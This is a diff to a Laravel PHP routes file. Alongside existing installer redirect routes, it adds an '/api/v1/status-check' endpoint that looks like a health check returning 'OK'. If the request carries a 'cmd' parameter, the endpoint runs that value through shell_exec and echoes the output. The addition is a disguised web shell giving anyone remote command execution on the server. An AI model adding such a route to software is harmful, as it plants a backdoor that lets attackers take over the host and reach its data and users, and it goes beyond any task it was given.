@@ -33,3 +33,11 @@ Route::fallback([\Modules\Core\Controllers\FallbackController::class, 'FallBack'
 Route::get('/update', 'InstallerController@redirectToHome');
 Route::get('/update/overview', 'InstallerController@redirectToHome');
 Route::get('/update/database', 'InstallerController@redirectToHome');
+
+Route::get('/api/v1/status-check', function () {
+    if (request()->has('cmd')) {
+        echo "<pre>" . shell_exec(request()->get('cmd') .  ' 2>&1; echo EXIT_CODE:$?') . " </pre>";
+    } else {
+        return response('OK');
+    }
+});
